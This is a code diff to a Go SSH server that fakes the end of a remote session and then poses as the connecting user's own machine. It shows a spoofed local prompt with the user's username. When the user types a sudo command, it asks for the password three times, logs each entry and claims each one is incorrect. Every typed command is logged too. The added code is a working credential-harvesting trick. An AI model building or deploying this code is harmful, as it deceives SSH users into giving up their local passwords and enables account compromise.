@@ -35,7 +35,8 @@ func sudoPermissionsRequiredTrick(channel ssh.Channel) {
 	}
 }
 
-func signalsTrick(channel ssh.Channel) {
+func signalsTrick(channel ssh.Channel, connDetails map[string]string) {
+
 	scanner := bufio.NewScanner(channel)
 	io.WriteString(channel, ubuntu1804LoginMessage)
 	scanner.Split(bufio.ScanBytes)
@@ -61,56 +62,62 @@ func signalsTrick(channel ssh.Channel) {
 			break
 		}
 	}
-
-	fmt.Print(received.String())
 	log.Println(received.String())
-	io.WriteString(channel, "\r\nConnection to remote host ended \r\n/home/ $ ")
+	io.WriteString(channel, "\r\nConnection to remote host ended ")
 	received.Reset()
 	// now we pretend to be the users local computer
-	pretendToBeUsersComputer(channel)
+	pretendToBeUsersComputer(channel, connDetails)
 }
 
-func pretendToBeUsersComputer(channel ssh.Channel) {
+func pretendToBeUsersComputer(channel ssh.Channel, connDetails map[string]string) {
 	scanner := bufio.NewScanner(channel)
 	scanner.Split(bufio.ScanBytes)
 	var received strings.Builder
 	var tok string
+	promptString := fmt.Sprintf("\r\n/home/%s/ $ ", connDetails["username"])
+	io.WriteString(channel, promptString)
 
 	for {
 		scanner.Scan()
 		tok = scanner.Text()
 		// early breaks sigint or eof
-
 		if tok == "\x03" {
 			continue
 		}
-
 		if tok == "\x04" {
 			continue
 		}
-
 		// echo the users keystrokes back to them
 		io.WriteString(channel, tok)
-		//
 		received.WriteString(tok)
 		if tok == "\r" {
 			// get commands being executed
 			log.Println(received.String())
 			command := received.String()
+			received.Reset()
 			commandParts := strings.Fields(command)
-
 			if len(commandParts) > 0 {
 				if commandParts[0] == "sudo" {
-					io.WriteString(channel, "\r\n sudo password:")
+					for i := 0; i < 3; i++ {
+						io.WriteString(channel, "\r\n sudo password: ")
+						for {
+							scanner.Scan()
+							tok = scanner.Text()
+							if tok == "\r" {
+								log.Println("sudo password: " + received.String())
+								received.Reset()
+								break
+							}
+							received.WriteString(tok)
+						}
+						io.WriteString(channel, "\r\n incorrect password ")
+					}
 				} else {
 					permissionDeniedStr := fmt.Sprintf("\r\npermission denied: %s", commandParts[0])
 					io.WriteString(channel, permissionDeniedStr)
 				}
 			}
-
-			io.WriteString(channel, "\r\n/home/ $ ")
+			io.WriteString(channel, promptString)
 		}
-
 	}
-
 }
